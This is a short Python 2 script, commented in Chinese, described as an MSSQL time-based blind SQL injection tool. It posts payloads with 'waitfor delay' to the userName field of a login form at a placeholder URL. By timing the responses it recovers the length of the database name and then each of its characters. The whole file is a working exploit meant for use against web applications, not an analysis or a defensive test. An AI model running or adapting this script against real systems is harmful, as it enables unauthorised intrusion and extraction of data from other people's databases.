# encoding:utf-8
import time
import requests
import sys

__author__ = 'whois'
__date__   = '2017/4/5'
"""
    MSSQL延迟注入脚本
"""

#my_time = 1
url = "http://www.fuck.com"
headers = {'user-agent':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04'}

function = "db_name()"    #设置函数db_name(),user_name()
payloads = '0123456789abcdefghijklmnopqrstuvwxyz@_-.'
my_user = ''
my_length = 1
time_sec = 4

# 检查长度
for length in xrange(1,30):
    s = "';if(len({0}))={1}/**/waitfor/**/delay/**/'0:0:{2}' --".format(function, length, time_sec)
    data = {"userName": "{0}".format(s), "password": "11", "checkCode": "3518"}
    start_time = time.time()

    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
    except Exception as e:
        print "[-] Url is error"
        exit(1)

    if time.time() - start_time > time_sec:
        my_length = length
        print "[+] Dbname length is {0}".format(length)
        break


# Fuzz
for num in xrange(1,my_length+1):
    for p in payloads:
        s = "';if(ascii(substring({0},{1},1)))={2}/**/waitfor/**/delay/**/'0:0:{3}' --".format(function,num, ord(p),time_sec)
        data = {"userName": "{0}".format(s), "password": "11", "checkCode": "2622"}

        start_time = time.time()

        try:
            r = requests.post(url,headers=headers,data=data)
        except Exception as err:
            print "[-] Url is error"
            exit(1)

        if time.time() - start_time > time_sec:
            my_user += p
            sys.stdout.write('\r'+my_user)
            break

print "\n[+] MSSQL DBname is {0}".format(my_user)